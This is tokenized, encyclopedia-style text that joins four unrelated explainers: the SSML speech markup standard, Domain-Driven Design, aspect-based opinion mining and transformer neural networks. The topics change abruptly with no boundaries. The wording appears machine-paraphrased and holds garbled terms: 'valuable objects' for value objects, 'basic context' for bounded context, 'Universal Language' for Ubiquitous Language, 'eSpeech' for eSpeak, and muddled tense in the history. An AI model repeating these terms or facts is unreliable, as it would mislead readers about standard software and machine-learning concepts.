These tokens are then converted into units of sounds called phonemes .
To speak all words in the same tone or loudness , creates monotony .
Prosody is therefore useful for making speech more natural and intelligible .
It draws attention to certain words by way of emphasis .
Prosody is about volume , pitch , and rate of speech .
We can specify the duration of a word and its pitch control .
What exactly is a phoneme and how does SSML use it ?
Once tokens are obtained via text normalization , the synthesizer must replace each token with a sequence of phonemes .
A phoneme is a unit of sound that distinguishes one word from another .
For most cases , a dictionary lookup is adequate , but when there 's ambiguity or non - standard pronunciation , ` phoneme ` or ` say - as ` elements can be used .
One example is " read " , which has differing pronunciation based on verb tense .
Another example is " Caius College " , which should be pronounced as " keys college " .
Phonemes are language dependent .
US English typically has 45 phonemes , Hawaiian has 12 - 18 , and some languages may have even 100 .
The ` phoneme ` element has an attribute ` alphabet ` that must at least support " ipa " as value , which refers to the International Phonetic Association ( IPA ) .
Other alphabets include Speech API Phone Set ( SAPI ) , Universal Phone Set ( UPS ) , , IBM TTS , and Extended Speech Assessment Methods Phonetic Alphabet ( X - SAMPA ) .
Which are the tags defined in SSML ?
Without being exhaustive , we mention a few important ones here .
SSML is basically an application of XML .
The basis of an SSML document is ` speak ` .
Using attributes , we can also specify the namespace and schema .
The attribute ` xml : lang ` specifies the language .
To load a lexicon from a known URI , we can use the ` lexicon ` element .
To translate tokens into phonemes using a specific lexicon , the ` lookup ` element is useful .
The ` say - as ` element has ` interpret - as ` as a mandatory attribute .
The standard does n't specify values for this attribute .
Typical implementations include address , cardinal , characters , date , digits , fraction , ordinal , telephone , time , expletive , unit , interjection , etc .
The ` sub ` element replaces the contained text with the ` alias ` attribute value for pronunciation .
When we need to specify language for a phrase , we can use ` lang ` with the attribute ` xml : lang ` .
Where applicable , I prefer to use the attribute with text structural elements ` p ` , ` s ` , ` w ` and ` token ` .
The element ` phoneme ` with the attribute ` ph ` specifies phonemic / phonetic pronunciation .
Attribute value does n't go through text normalization or lexicon lookup .
Many elements control prosody : ` voice ` , ` emphasis ` , ` break ` , ` prosody ` .
Attributes of ` prosody ` include ` pitch ` , ` contour ` , ` range ` , ` rate ` , ` duration ` and ` volume ` .
Which are some real - world applications that use SSML ?
Guardian serves news in audio form using the Google text - to - speech API .
Source : Coleman 2019 .
Since 2019 , the Guardian has been providing users with important news in audio as well .
They use Google 's text - to - speech API , which the input includes SSML .
They noted that SSML parsing is slow .
The API took about 8 - 10 seconds to generate the audio .
Therefore , they opted to serve cached audio rather than just - in - time generation .
In the UK , the NHS is using Amazon Polly to stream synthesized speech through telephone lines .
This is a low - cost approach that uses widespread telephone networks to deliver healthcare remotely .
A typical response latency of 60ms was observed .
They use SSML , although many features are not yet used .
One blogger has suggested voice - based document reviews during long commutes .
A document is converted into multiple MP3 files , each with a different voice and cadence .
AWS Lambda is used to convert the document to multiple SSML files .
Another Lambda call triggers conversion of SSML files to MP3 files .
What tips can you give for content writers and developers working with SSML ?
An SSML WYSIWYG editor and tester .
Source : Top Voice Apps 2019 .
With SSML , content creators can miss a closing tag or double quotes for element attributes .
In the world of HTML , this problem was solved by Markdown syntax .
Likewise , a replacement for SSML is Speech Markdown .
However , we need converters to SSML until synthesizers can natively support Speech Markdown .
An alternative is to use an SSML editor .
Examples are from Verndale , PlayX - team at Swedish Radio and SSML Editor .
You could even create your own SSML editor , which is based on Sanity.io and React.js .
Content creators can refer to an Amazon Alexa SSML cheatsheet .
YouTube audio library provides more than 5,000 free sounds that we can use in our SSML .
Developers can refer to a JavaScript implementation of an SSML parser .
The Node.js package ssml - builder allows us to create SSML programmatically using the builder pattern .
Among the open - source speech synthesizers are FreeTTS ( Java ) and eSpeech ( C ) .
There are also commercial text - to - speech engines that support SSML .
Cepstral and CereVoice are examples .
CereVoice includes a Scottish - accented female voice , a vocal gesture library and patented Emotional Synthesis .
What are some criticisms of SSML ?
Although SSML is a W3C standard , not all its features are supported by vendors .
For example , IBM 's text - to - speech service does n't support or provides only partial support for many SSML elements or attributes .
Google Assistant does n't support the ` phoneme ` element .
Moreover , each vendor is introducing its own proprietary elements .
Amazon Alexa 's ` amazon : effect ` is proprietary .
Google Assistant makes use of ` par ` , ` seq ` and ` media ` .
These can be used to add background music ; or create containers to play media in sequence or in parallel .
Elements ` par ` and ` seq ` are part of another W3C standard called Synchronized Multimedia Integration Language ( SMIL ) .
Parsing SSML in real time could be slow .
For content writers , writing in SSML could be cumbersome and they may prefer Speech Markdown in future .
SSML DTD as example .
Source : Isard 1995 , fig .
5 - 1 , 5 - 2 .
Amy Isard at the University of Edinburgh completes her thesis on SSML with supervisor Paul Taylor .
She describes SSML as an application of SGML .
She also presents a prototype implementation that 's understood by the CSTR Speech Synthesizer .
This implementation includes phrase boundaries , emphasized words , specified pronunciations , and inclusion of other sounds files .
The concept of SSML was first introduced by Paul Taylor in 1992 .
VoiceXML interworks with SSML and others .
Source : Froumentin 2004 .
W3C organizes a workshop titled " Voice Browsers " .
The idea is to allow people with telephone connections to access Web content .
This led to the formation of the Voice Browser Working Group ( VBWG ) in March 1999 .
These are the first steps towards the later standardization of SSML and related technologies .
Prosody support among speech synthesizers .
Moore and Eyckelhof 1999 .
One study compares many speech synthesizers on the market .
Each supports different aspects of prosody .
There 's no mention of SSML in the report .
TrueTalk is said to be using escape sequences , which are very system specific .
Since each system uses its own proprietary annotations or escape sequences , such annotated input is not portable .
SSML is an attempt to introduce a standard to solve this .
JSpeech Markup Language ( JSML ) is published as a W3C Note .
It 's inspired by Isard 's SSML thesis and is derived from the Java Speech API Markup Language that was developed at Sun Microsystems in the late 1990s .
Version 1.0 of SSML is published as a W3C Candidate Recommendation .
A draft of this can be traced to August 2000 .
Voice Extensible Markup Language ( VoiceXML ) is published as a W3C Recommendation .
VoiceXML is designed for " creating audio dialogs that feature synthesized speech , digitized audio , recognition of spoken and DTMF key input , recording of spoken input , telephony , and mixed initiative conversations " .
SSML elements can be used within the ` prompt ` element of VoiceXML .
SSML elements such as ` audio ` and ` say - as ` can have additional attributes when used within VoiceXML .
Version 1.1 of SSML is published as a W3C Recommendation .
Compared to V1.0 , this version addresses the needs of many natural languages .
Amazon Alexa introduces five new SSML tags : ` amazon : effect name="whispered " ` , ` say - as interpret - as="expletive " ` , ` sub ` , ` emphasis ` and ` prosody ` .
Amazon Polly , a text - to - speech service , adds an SSML breath feature .
Instead of inserting pauses between words , breath sounds can result in more natural sounding speech .
The feature allows for manual , automated and mixed modes of inserting breath .
Overview of Domain - Driven Design .
Source : The DDD Community 2019 , pp .
6 .
Writing software involves software architects and programmers .
They understand software concepts , tools and implementation details .
But they may be disconnected from business and hence have an incomplete understanding of the problem they 're trying to solve .
Domain - Driven Design ( DDD ) is an approach towards a shared understanding within the context of the domain .
Large software projects are complex .
DDD manages this complexity by decomposing the domain into smaller subdomains .
Then it establishes a consistent language within each subdomain so that everyone understands the problem ( and the solution ) without ambiguity .
DDD is object - oriented design done right .
Among its many benefits are better communication , common understanding , flexible design , improved patterns , meeting deadlines , and minimizing technical debt .
However , DDD requires domain experts , additional effort and , hence , is best applied to complex applications .
What do you mean by ' domain ' in the context of domain - driven design ?
The domain of e - commerce and its subdomain .
Source : Łukasz 2018 .
A domain can be defined as " a sphere of knowledge , influence or activity .
" For example , accountancy is a domain .
An accountant is someone who knows this domain well .
She is considered a domain expert .
She 's perhaps not a programmer and , therefore , ca n't build accounting software .
But she can advise developers on the intricacies and workings of the domain .
Consider the domain of air traffic .
A developer might imagine that pilots decide on the route ( a sequence of 3D points ) to a destination .
A domain expert might clarify that routes are pre - determined and each route is actually a ground projection of the air path .
To better manage complexity , a domain can be broken down into subdomains .
In the e - commerce domain , Payment , Offer , Customer and Shipping are possible subdomains .
The domain is a business or problem to be solved .
A model is the solution .
Likewise , subdomains in the problem space are mapped into bounded contexts in the solution space .
Could you explain the relevance of bounded contexts ?
Two bounded contexts with two related concepts .
Source : Fowler 2014 .
Consider the terms Member and Payment used in a country club .
For some stakeholders , the terms relate to club membership fees ; for others , they 're about tennis court booking fees .
This disconnect is an indication that the domain is not really one and indivisible .
There are subdomains hiding in there and they 're best modelled separately .
Bounded contexts are the solution .
When a model is proposed for a subdomain , it 's applied only within the boundaries of the subdomain .
These boundaries in the solution space define a bounded context .
When teams understand the bounded contexts , it becomes clear what parts of the system have to be consistent ( within a bounded context ) and what parts can develop independently ( across bounded contexts ) .
Bounded contexts therefore imply a clear separation of concerns .
Without basic contexts , we 'll end up with a single large complex model of many entities and relationships .
Entities will get tightly coupled together .
The end result is often called a Big Ball of Mud .
Bounded contexts may overlap or may be neatly partitioned .
Bounded contexts often relate to one another and this is captured in a context map .
What is meant by the term Ubiquitous Language ?
Ubiquitous Language enables better understanding of the domain and model among different stakeholders .
Source : Millett and Knight 2017 , pp .
9 .
A developer might state that " a database was updated and triggered an SMTP service .
" A domain expert unfamiliar with such technical jargon will be left confused .
Ubiquitous Language ( UL ) is an attempt to get everyone to use words well - understood within the basic context .
Using UL , the developer would now state that " the pizza was delivered and a coupon was sent to the customer .
" UL must be consistent and unambiguous .
It should evolve as understanding of the domain changes .
A change in language implies a change to the model .
In fact , the model is not just a design artifact used just to draw UML diagrams .
model is the backbone of the language .
Within a bounded context , use the same language in diagrams , writing , speech and code .
To create an UL , have an open discussion , analyze existing documents , express the domain clearly , and define an agreed glossary .
Glossary alone wo n't help .
Use it consciously to arrive at a common understanding of the model .
How should I implement Universal Language in my code ?
The use of UL in discussions can facilitate code refactoring .
Source : Hao 2016 .
Since documents can get outdated quickly , code is an enduring expression of the Universal Language .
Adopting UL in naming convention leads to clean readable code .
The purpose of variables , methods , classes and APIs has become easier to see .
We call this intention - revealing interfaces .
Example names that follow UL are ` TaskReservation ` , ` ReservationAttempt ` , ` IsFulfilled ` , ` BookSeats ` , ` Reservation ` , and ` Confirm ` .
In fact , there are tools to check if names in the code follow the domain 's defined vocabulary .
NDepend is one such tool .
Without UL , a shared understanding is hard to achieve and teamwork suffers .
Even among technical folks , one may refer to ` coupon ` in an API but call them ` discounts ` on the backend .
Another mismatch is when a checkout workflow is mapped to the ` RideCommerce ` service .
Perhaps , this was documented somewhere but the documentation was not read by everyone .
Any code refactoring must n't happen without discussion using the UL .
For example , discussion could involve these questions to clarify concepts : " When you say ` User ` , do you mean ` Driver ` ?
" or " Do you think a ` Coupon ` is applied to the ` BookingAmount ` , or is it added ?
" Could you describe some essential terms of DDD ?
A navigation map of terms used in domain - driven design .
Source : Negi 2017 .
From a comprehensive online DDD glossary , we describe some essential terms : Entity : An object that has attributes but is primarily defined by an identity .
Value Object : An object with attributes but no identity .
Aggregate : A cluster of objects treated as a single unit .
External references are restricted to only one member , called the Aggregate Root .
A set of consistency rules applies within the aggregate 's boundaries .
Factory : A mechanism to encapsulate and abstract away the details of creating a complex object .
A factory ensures aggregates are initialized to a consistent state .
Repository : A mechanism to encapsulate storage , search and retrieval of a collection of objects .
Its implementation is not a domain concern .
Service : A stateless functionality that renders its service via an interface , typically used when a workflow does n't fit the current model .
Could you explain the entities and value of objects ?
The domain determines if an object is an entity or a valuable object .
Source : Devopedia 2020 .
Entities and valuable objects both follow principles of object - oriented design .
They both encapsulate data ( attributes ) and behaviour ( methods ) .
The key difference is that an entity is distinguished by its identity , which must be unique within the system .
On the other hand , valuable objects are descriptive with no conceptual identity .
When we say that two entities are the same , we mean that their identities match , with possibly different attributes .
When we compare two valued objects , we 're only checking if their attributes match .
Thus , entities use identifier equality and value objects use structural equality .
An entity has a lifecycle .
Its form and content can change but not its identity .
Identity is used to track the entity .
Value objects are ideally immutable .
In a banking application , transactions are entities , each with a unique transaction number .
The amount transacted is a valuable object .
A cheque 's date may differ from the date of clearing but entries are always reconciled not by date but by the cheque number .
This is an example of comparing entities by identities rather than by attributes .
Could you explain the concept of aggregates in DDD ?
Illustrating the aggregate pattern in DDD .
Source : Microsoft Docs 2018 , fig .
7 - 9 .
When a cluster of entities or value objects control a significant area of functionality , it 's easier to abstract them into a single consistent unit .
This is the aggregate pattern .
One way to identify aggregates is to look at common transactions and the entities that get involved .
Since an aggregate is a cohesive unit , it 's best to ensure consistency by using a single aggregate root for all updates .
Changing a child 's entity independently will break consistency since the root is unaware of such direct updates .
As an example , consider two aggregates , Buyer and Order .
Order has as entities Order and OrderItem ; and Address as a value object .
However , all external interactions are via the order entity , which is the root .
This entity refers to the root of the buyer by identity ( foreign key ) .
Keep an aggregate on one server and allow aggregates to be distributed among nodes .
Within an aggregate , update synchronously .
Across aggregate boundaries , update asynchronously .
Often , NoSQL databases can manage aggregates better than relational databases .
Could you share some tips for practising DDD ?
Objects with hardly any behaviour represent poor application of object - oriented design .
They 're little more than procedural - style design .
This anti - pattern is called the Anemic Domain Model .
Instead , put business logic in domain objects .
Other DDD anti - patterns to avoid include repetitive data access objects ( use repositories instead ) , fat service layers , and classes that frequently access other classes ' data .
Adopt a layered architecture to avoid details of application , presentation or data persistence from creeping into the domain layer .
Analyze the problem domain before deciding if a concept should be an entity or a valuable object .
Do n't link a value object to an entity , which would require an identity for the value object .
Instead , the value object can be inlined into the entity .
Difficulties in implementing an aggregate usually indicate a modelling problem .
Instead , attempt to refine the model .
If an operation does n't fit the current model , evolve the model .
Only if that 's not possible , will you consider introducing a service .
Since services represent activities , use verbs rather than nouns in naming .
Indeed , DDD is not for perfectionists .
It 's okay if the model ca n't handle some special cases .
Use services rather than a leaky or confusing abstraction .
Software engineers have recognized since the late 1960s that procedural languages are inadequate for handling the growing complexity of software projects .
When Simula 67 was released in 1967 , it became the first object - oriented programming ( OOP ) language .
Concepts of OOP and OOD reached maturity in the early 1980s .
Foote and Yoder observe that while there are many high - level software architectural patterns , what 's really prevalent in the industry is " haphazardly structured , sprawling , sloppy , duct - tape and bailing wire , spaghetti code jungle .
" They call this the Big Ball of Mud .
The code is dictated by expediency rather than design .
The mantra has been , " Make it work .
Make it right .
Make it fast .
" Popular practices include immediate fixes and quick prototypes .
Programmers work without domain expertise .
No thought is given to the elegance and efficiency of the code .
Eric Evans published a book titled Domain - Driven Design : Tackling Complexity in the Heart of Software .
Evans is credited for coining the term Domain - Driven Design .
This is also called the " Blue Book " .
At QCon , Phil Wills presents a case study about how The Guardian website was almost completely rebuilt following the principles of DDD .
He mentions some key points : domain experts got more involved ; they kept the model flexible to changes even when deadlines were met ; they focused on core subdomains while leveraging on off - the - shelf software for the rest .
The term microservices was discussed at a workshop of software architects near Venice , to describe a common architectural style that several of them were exploring at the time .
An application is decomposed into loosely coupled services , each being self - contained and managing its own data .
From the perspective of DDD , a microservice maps to a subdomain and basic context .
Vaughn Vernon publishes a book titled Implementing Domain - Driven Design .
This is also called the " Red Book " .
Eric Evans notes at the Explore DDD conference that DDD remains relevant today , fourteen years after he coined the term .
Many tools have come to support and adopt DDD .
Though DDD is not about technology , it 's not indifferent to technology .
With technology 's support , we can focus on building better models .
He gives some examples .
NoSQL databases make it easier to implement aggregates .
With modern functional languages , it 's easier to implement immutable value objects .
Microservices have come to represent bounded contexts .
DDD is in the Late Majority stage of the technology adoption curve .
Source : Humble et al .
2019 .
A report published by InfoQ shows DDD in the late majority stage of technology adoption .
This is proof of its effectiveness in software development .
This stage implies that more than half the software folks have adopted DDD and the skeptics are starting to adopt them too .
Only a year earlier , DDD was in the Early Majority stage .
Two cellphones compared across General plus five specific aspects from user reviews .
Source : Liu 2011 , fig .
11.2B. Aspect - Based Opinion Mining ( ABOM ) involves extracting aspects or features of an entity and figuring out opinions about those aspects .
It 's a method of text classification that has evolved from sentiment analysis and named entity extraction ( NER ) .
ABOM is thus a combination of aspect extraction and opinion mining .
While opinions about entities are useful , opinions about aspects of those entities are more granular and insightful .
The ABOM workflow constitutes initial text pre - processing , POS tagging , splitting sentences to extract aspects and classifying them into various dimensions / buckets .
A 2018 survey states that 90 % of the total data in the world has been generated in the last two years in the form of tweets , text , images and video .
ABOM is therefore important in analyzing this unstructured data .
What is your opinion of mining and its importance ?
Opinion mining map .
Source : Hemmatian 2019 , fig .
1 .
Suppose a written or spoken content expresses an opinion about some subject .
Extraction of these opinions is called opinion mining .
For example , " Adam was very satisfied with the flavour of black tea at Starbucks " .
Here we extract a positive opinion about black tea ( entity ) whose aspect is flavour .
With the increased use of online transactions and service - based industries , there has been an immense growth in consumer reviews and opinions through voice or text .
Opinion mining finds out sentiments from these reviews and estimates customer satisfaction .
Sentiment analysis and opinion are related .
Sentiment analysis is first done to extract positive , negative or neutral sentiments .
This leads to opinion mining using various text classifiers .
What do you mean by aspects and why are they relevant ?
Aspects of a restaurant and opinions on those aspects .
Source : Min 2018 , fig .
2 .
Consider the example of " ice - cream " as an entity .
Aspects or features of this entity include flavour , temperature , taste , presentation , etc .
A person may express that he disliked the ice - cream , but this is expressing an opinion about the overall entity .
If we analyze this deeper , we may find that the person liked the flavour and the presentation but did n't like the taste .
Thus , figuring out opinions on specific aspects gives more useful information that can aid decision making .
With " restaurant " as the entity , its aspects could include food , service , price , ambience , etc .
Often , user reviews or ratings of the restaurant as a whole are not actionable .
However , if we know that the food was great but the music was terrible , the restaurant owner can take actions to improve on specific aspects .
What 's the workflow of ABOM ?
Opinion Mining Process .
Source : Hemmatian 2017 , Fig1 .
ABOM involves data collection , data cleaning , extraction of aspects and entities , classification of aspects and entities , sentiment scoring of aspects , evaluation and validation .
A text is typically split into sentences and parsed according to Named Entity Recognition ( NER ) , which extracts the entities .
With aspect mining , we find out features or characteristics of these entities .
There are some automated aspect extractor APIs .
The output from such APIs can be validated and improved manually .
Data pre - processing is time - consuming .
Selecting and training aspects of entities are complex tasks .
Some approaches include aggregate score of opinion words , SentiWordNet , aspect table , dependency relations , emotion analysis using lexicon and semantic representation .
Opinion mining is usually a rule - based approach where frame certain rules to identify the most used words .
These are further analyzed and processed .
A dictionary - based approach is to curate common words of aspect terms for further classification according to various domains .
Could you describe the classification of opinions in ABOM ?
The classification of opinion completely depends on the dataset and business problem .
Opinion classifications could be trend based , aspect based , sentence based , etc .
from tweets , reviews , blogs and others .
The most versatile way of classification holds positive and negative analysis .
Similarly , classification can be done on a multi - aspect basis using co - occurrence of aspects and sentiments , aspect - sentiment hierarchy and polarity classification of sentiments .
These are different approaches of classification where aspects are filled into different buckets according to polarity from sentiment scores or design / occurrence of aspects with POS tags .
There are several researchers who work on automatic aspect generation and classification after effective cleaning of unwanted and irrelevant sentences .
Insignificant words or sentences make the data noisy and degrade the classification accuracy .
To get rid of this , automatic aspect extraction methods like fuzzy aspect based opinion classification can be used .
This method covers the demerits of infrequent and coreferential aspects and gives good classification accuracy .
What are some techniques for extracting aspects ?
Dependency rules in rule - based methods to extract aspects .
Source : Joshi et al .
2018 .
Among the supervised techniques are the Hidden Markov Model ( HMM ) , Conditional Random Fields ( CRFs ) and dependency tree kernels .
Among the unsupervised ones are frequency or statistical methods , rule - based methods , and Pointwise Mutual Information ( PMI ) .
Latent Dirichlet Allocation ( LDA ) from topic modelling has also been adapted and applied .
PMI is a score that indicates how often a candidate 's aspect co - occurs with an entity .
Low PMI implies it 's probably not an aspect .
PMI has been used along with Term Frequency - Inverse Document Frequency ( TF - IDF ) .
Some techniques are able to extract both explicit and implicit aspects .
Association rules for mining and clustering have been adapted to extract implicit aspects .
Dependency rules and lexicons such as WordNet and SenticNet have been used to identify implicit aspects .
Some techniques jointly model both aspects and opinions .
One well - known technique is called double propagation , that exploits syntactic relations of opinion words and aspects .
From known opinion words , aspects can be extracted .
From known aspects , new opinion words can be identified ; and so on .
Neural network approaches such as CNN , LSTM , and attention mechanisms have been applied as well .
Could you share some tips and best practices for doing ABOM ?
When extracting aspect , we must always know which entity it belongs to .
Consider , for example , " The picture quality of this camera is amazing " versus " I love this camera " .
In the former sentence , " picture quality " is the aspect .
In the latter sentence , the camera entity is evaluated as a whole and hence the aspect is " general " .
It 's essential to consider the domain of application .
The phrase " please go and read the book " is a positive opinion for a book review but a negative one for a movie review .
This implies that we should train our models with domain - specific data .
Sometimes opinion words on their own are inadequate .
They need to be analyzed along with the aspect .
For example , even within the same domain of digital cameras , " long " can either be positive or negative depending on the context , such as " long battery life " versus " takes long time to focus " .
For a developer , what are some resources and projects to learn ABOM ?
One can start an ABOM project with online reviews .
There are many e - commerce and social websites containing thousands of reviews on any topic , person or product .
Twitter , Facebook , Amazon , MouthShut , and Yelp are example sources .
These reviews can be scraped using any API or libraries like BeautifulSoup or Scrapy in Python .
Some sample projects can be aspect - based sentiment analysis for e - commerce websites or restaurants .
In the latent aspect rating analysis , ratings were predicted using the latent opinions from review text data .
This work can be replicated in different industries such as hospitality , automotive , and education .
What are some industrial applications of ABOM ?
Aspect based opinion mining on a hotel .
Source : Tripathi 2019 , Fig 10 .
ABOM applications are spread out across various industries wherever there is customer feedback .
Examples include travel , automotive , hotels , tourism , ecommerce and many more .
Usually , before any hotel booking , people read reviews .
We can distribute these into several buckets , like service , ambience or hygiene .
This makes it easier for customers to compare different hotels .
Similarly , there are several websites for travel , like Yelp , Trip Advisor or MakeMyTrip that categorize the service into relevant aspects and show it in the form of ratings .
In every industry , reviews are broken down into aspects and rated according to domain knowledge .
Good domain knowledge is essential for better decision making .
Before any drug trials or testing , there needs to be a lot of expert opinion from doctors and domain - specific experts .
This work takes a very long time to come to a conclusion .
ABOM simplifies it by rating several aspects like adverse reactions , efficacy of a drug , symptoms and conditions of patients .
The early 2000s saw the birth of social networking sites .
Blogs , online reviews , and other forms of unstructured content online have become common .
This leads to opinion classification from web documents , which are assessed for positive or negative sentiments .
Opinion mining summarization system .
Source : Hu 2004 , fig .
3 .
Work on opinion mining starts with the realization that the importance of opinions on various aspects is more insightful rather than summary of reviews .
At this time , ABOM is called feature - based opinion mining .
Researchers started working on text summarization and opinion mining due to the large scale availability of customer reviews and an increasing demand for customer satisfaction .
Aspect evaluation relations and aspect - of relations are combined together .
Contextual and statistical combinations have started to be used in text classification based on opinions .
System architecture of online opinion extractor .
Source : Eirinaki 2011 , fig .
4 .
Researchers start to rank aspects according to various web - based opinions after training them .
A new opinion search engine is being proposed .
This searches for the item along with its summary of sentiments across features .
This gives a start to automatic aspect extraction .
Aspect based opinion mining is now popular in many industries .
This enhances consumer satisfaction and drives decision making .
Techniques begin to recognize explicit versus implicit aspect expressions .
Precision and recall scores from experiments exceed 90 % .
Due to millions of online reviews , a user could get confused about the features of a product .
By scraping online reviews and content , ABOM can now be used as a personal recommender .
People are given recommendations according to their choices and preferences .
As a neural network approach to ABOM , Long Short - Term Memory ( LSTM ) is used for extracting opinion target expressions ( OTEs ) and aspect sentiment polarities .
Using various types of neural networks is an art now for researchers and we hope to see better accuracy and automation in ABOM across various industries .
An Example of self - attention within a word sequence .
Source : Weng 2018 .
Given a word sequence , we recognize that some words within it are more closely related to one another than others .
This gives rise to the concept of self - attention in which a given word " attends to " other words in the sequence .
Essentially , attention is about representing context by giving weight to word relations .
The transformer is a neural network architecture that makes use of self - attention .
It replaces earlier approaches of LSTMs or CNNs that used attention between encoder and decoder .
Transformer showed that a feed - forward network used with self - attention is sufficient .
Influential language models such BERT and GPT-2 are based on the transformer architecture .
By 2019 , transformer architecture will become an active area of research and application .
While initially created for NLP , it 's being used in other domains where problems can be cast as sequence modelling .
How is the transformer network better than CNNs , RNNs or LSTMs ?
Machine translation using transformer .
Source : Bradbury 2017 , fig .
2 .
Words in a sentence come one after another .
The context of the current word is established by the words surrounding it .
RNNs are suited to modelling such a time - sequential structure .
But an RNN has trouble remembering long sequences .
LSTM is an RNN variant that does better in this regard .
CNN architectures WaveNet , ByteNet and ConvS2S have also been used for sequence - to - sequence learning .
Moreover , RNNs and LSTMs consider only words that have gone before ( although there are bidirectional LSTMs ) .
Self - attention models the context by looking at words before and after the current word .
For instance , the word " bank " in the sentence " I arrived at the bank after crossing the river " does n't refer to a financial institution .
The transformer can figure out this meaning because it looks at subsequent words as well .
The sequential nature of RNNs implies that tasks ca n't be parallelized on GPUs and TPUs .
The transformer 's encoder self - attention can be parallelized .
While CNNs are less sequential , complexity still grows logarithmically .
It 's worse for RNNs where complexity grows linearly .
With transformers , the number of sequential operations is constant .
What 's the architecture of the transformer ?
Transformer architecture shows an encoder ( left ) and a decoder ( right ) .
Source : Vaswani et al .
2017 , fig .
1 .
The transformer of Vaswani et al .
basically follows the encoder - decoder model with attention passed from encoder to decoder .
Both encoder and decoder stack multiple identical layers .
Each encoder layer uses self - attention to represent context .
Each decoder layer also uses self - attention in two sub - layers .
While the encoder 's self - attention uses both left and right context , the lower sub - layer of the decoder masks out the future positions while predicting the current position .
In each layer we find some common elements .
Residual connections are made .
These are added and normalized with connections flowing via the self - attention sub - layers .
There are no recurrent networks , only a fully connected feed - forward network .
At the input , source and target sequences are represented as embeddings .
These are enhanced with positional encoding .
At the output , a linear layer is followed by softmax .
The transformer 's encoder can work on the input sequence in parallel but the decoder is auto - regressive .
Each output is influenced by previous output symbols .
Output symbols are generated one at a time .
How is self - attention computed in a transformer network ?
Attention is computed using query , key and value vectors .
Source : Vaswani et al .
2017 , fig .
1 .
Every word is projected on to three vectors : query , key and value .
Respective weight matrices \(W\ ) to do this projection are learned during training .
Suppose we 're calculating the attention to a particular word .
A dot - product operation of its query vector with the key vector of each word is calculated .
Dot - product attention is scaled with \(1/\sqrt d_k\ ) to compensate for large dot - product values .
The value vectors are weighted with weights from the dot product and then summed .
For better results , multi - head attention is used .
Each head learns a different attention distribution , similar to having multiple filters on CNN .
For example , if the model dimension is 512 , instead of a large single attention layer , we use 8 parallel attention layers , each operating on 64 dimensions .
Output from the layers is concatenated to derive the final attention .
Mathematically , we have the following : $ $ MultiHead(Q , K , V ) = Concat(head_1, ... ,head_h)W^O\\head_i = Attention(QW^{Q}_i , KW^{K}_i , VW^{V}_i)\\Attention(Q , K , V ) = softmax(\frac{QK^T}{\sqrt d_k})V$$ The original transformer of Vaswani et al .
uses self - attention within encoder and decoder , but also transfers attention from encoder to decoder as is common in traditional sequence - to - sequence models .
How does the transformer network capture the position of words ?
In RNNs , the sequential structure accounts for position .
In CNNs , positions are considered within the kernel size .
In transformers , self - attention ignores the position of tokens within the sequence .
To overcome this limitation , transformers explicitly add positional encoding .
These are added to the input or output embeddings before the sum goes into the first attention layer .
Positional encoding can either be learned or fixed .
In the latter case , Vaswani et al .
used sine and cosine functions for even and odd positions respectively .
They also used different frequencies for different positions to make it easier for the model to learn the positions : $ $ PE_{(pos,2i)}=sin(pos/10000^{2i / d_{model}})\\PE_{(pos,2i+1)}=cos(pos/10000^{2i / d_{model}})$$ While Vaswani et al .
( 2017 ) considered absolute positions , Shaw et al .
( 2018 ) looked at the distance between tokens in a sequence , that is , relative positioning .
They showed that this leads to better results for machine translation , with the trade - off of 7 % decrease in steps per second .
Could you share some applications of the transformer network ?
BERT improves Google search results .
Source : Nayak 2019 .
In October 2019 , Google announced the use of BERT for 10 % of its English language search .
Search will attempt to understand queries the way users tend to ask them in a natural way .
This is opposed to parsing the query as a bunch of keywords .
Thus , phrases such as " to " or " for someone " are important for meaning and BERT picks up these .
We can use transformers to generate synthetic text .
Starting from a small prompt , the GPT-2 model is able to generate long sequences and paragraphs of text that are realistic and coherent .
This text also adapts to the style of the input .
For correcting grammar , transformers provide competitive baseline performance .
For sequence generation , the Insertion Transformer and Levenshtein Transformer have been proposed .
Transformers have been used beyond NLP , such as for image generation where self - attention is restricted to local neighbourhoods .
The Music Transformer applied self - attention to generate long pieces of music .
While the original transformer used absolute positions , the music transformer used relative attention , allowing the model to create music in a consistent style .
Which are the well - known transformer networks ?
BERT is bidirectional while GPT ( and GPT-2 ) is not .
Source : Devlin et al .
2019 , fig .
3 .
BERT is an encoder - only transformer .
It 's the first deeply bidirectional model , meaning that it uses both left and right contexts in all layers .
BERT showed that as a pretrained language model it can be fine - tuned easily to obtain state - of - the - art models for many specific tasks .
BERT has inspired many variants : RoBERTa , XLNet , MT - DNN , SpanBERT , VisualBERT , K - BERT , HUBERT , and more .
Some variants attempt to compress the model : TinyBERT , ALERT , DistilBERT , and more .
The other competitive model is GPT-2 .
Unlike BERT , GPT-2 is not bidirectional and is a decoder - only transformer .
However , the training includes both unsupervised pretraining and supervised fine - tuning .
The training objective combines both of these to improve generalization and convergence .
This approach of training on specific tasks is also seen in MT - DNN .
GPT-2 is auto - regressive .
Each output token is generated one by one .
Once a token is generated , it 's added to the input sequence .
BERT is not auto - regressive but instead uses context from both sides .
XLNet is auto - regressive while also using context from both sides .
What are some variations of the transformer network ?
Transformer - XL uses segment - level recurrence .
Source : Dai et al .
2019 , fig .
2 .
Compared to the original transformer of Vaswani et al .
, we note the following variations : Transformer - XL : Overcomes the limitation of fixed - length context .
It makes use of segment - level recurrence and relative positional encoding .
DS - Init & MAtt : Stacking many layers is problematic due to vanishing gradients .
Therefore , depth - scaled initialization and merged attention sublayer are proposed .
Average Attention Network ( AAN ) : With the original transformer , the decoder 's self - attention is slow due to its auto - regressive nature .
Speed is improved by replacing self - attention with an average layer followed by a gating layer .
Dialogue Transformer : Conversation that has multiple overlapping topics can be picked out .
Self - attention is over , the dialogue sequence turns .
Tensor - Product Transformer : Uses novel TP - Attention to explicitly encode relations and applies it to math problem solving .
Tree Transformer : Puts a constraint on the encoder to follow tree structures that are more intuitive to humans .
This also helps us learn grammatical structures from unlabelled data .
Tensorized Transformer : Multi - head attention is difficult to deploy in a resource - limited setting .
Hence , multi - linear attention with Block - Term Tensor Decomposition ( BTD ) is proposed .
For a developer , what resources are out there to learn transformer networks ?
To get a feel of transformers in action , you can try out Talk to Transformer , which is based on the full - sized GPT-2 .
HuggingFace provides implementation of many transformer architectures in both TensorFlow and PyTorch .
You can also convert them to CoreML models for iOS devices .
Package spaCy also interfaces to HuggingFace .
TensorFlow code and pretrained models for BERT are available .
There are also codes for Transformer - XL , MT - DNN and GPT-2 .
TensorFlow has provided an implementation for machine translation .
Lilian Weng 's implementation of the transformer is worth studying .
